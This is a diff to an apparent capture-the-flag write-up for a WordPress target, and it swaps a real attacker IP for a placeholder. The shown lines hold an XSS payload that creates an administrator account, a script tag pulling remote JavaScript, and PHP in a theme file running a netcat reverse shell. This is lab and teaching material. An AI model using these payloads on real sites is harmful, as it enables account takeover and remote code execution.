@@ -142,7 +142,7 @@ jQuery.get(u,function(e){
     role:"administrator"
   });
 });</pre>
-      <pre>&lt;script src='http://10.10.15.145:8000/x.js'&gt;&lt;/script&gt;</pre>
+      <pre>&lt;script src='http://[IP]:8000/x.js'&gt;&lt;/script&gt;</pre>
       <p>Once the admin account is created we log into <code>/wp-admin</code>.</p>
 
       <h3>Theme File Editor RCE → www-data</h3>
@@ -151,7 +151,7 @@ jQuery.get(u,function(e){
 │       wp-admin → Appearance → Theme File Editor → footer.php
 │       inserted &lt;?php exec("busybox nc ATTACKER_IP 445 -e sh"); ?&gt;
 │       visited page to trigger → reverse shell → uid=33(www-data)</pre>
-      <pre>&lt;?php exec("busybox nc 10.10.15.145 1337 -e sh") ;?&gt;</pre>
+      <pre>&lt;?php exec("busybox nc [IP] 1337 -e sh") ;?&gt;</pre>
       <p>Reloading the main page fires the shell back as <code>www-data</code>.</p>
 
       <h2>Lateral Movement</h2>
